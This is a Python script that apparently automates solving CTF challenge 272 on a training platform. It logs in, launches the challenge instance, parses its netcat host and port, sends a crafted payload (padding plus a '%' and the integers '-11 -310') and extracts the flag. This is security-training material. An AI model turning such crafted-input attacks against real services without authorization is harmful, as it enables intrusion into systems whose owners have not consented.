import sys, re, json, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=0.4)
cy.login()
cy.req("PUT", "/api/challenges/272/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(0.8)
    st, b = cy.req("GET", "/api/challenges/272/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    desc = d.get("description") or ""
    m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", desc)
    if not m:
        m2 = re.search(r"([A-Za-z0-9.\-]+\.cylabacademy\.net):(\d{2,5})", desc)
        if m2:
            host, port = m2.group(1), int(m2.group(2))
            break
    else:
        host, port = m.group(2), int(m.group(3))
        break
print("cible:", host, port)
story = "A" * 20 + "%"
for attempt in range(4):
    try:
        s = socket.create_connection((host, port), timeout=12)
        s.settimeout(5)
        time.sleep(0.4)
        try:
            s.recv(300)
        except Exception:
            pass
        s.sendall(story.encode() + b"\n")
        time.sleep(0.4)
        s.sendall(b"-11 -310\n")
        time.sleep(0.8)
        out = b""
        t0 = time.time()
        while time.time() - t0 < 5:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        s.close()
        txt = out.decode("latin-1", "replace")
        print("reponse:", txt.replace("\n", " ")[:250])
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        if m:
            print("FLAG:", m.group(0))
            break
    except Exception as e:
        print("essai", attempt + 1, "ERR", type(e).__name__)
        time.sleep(2)
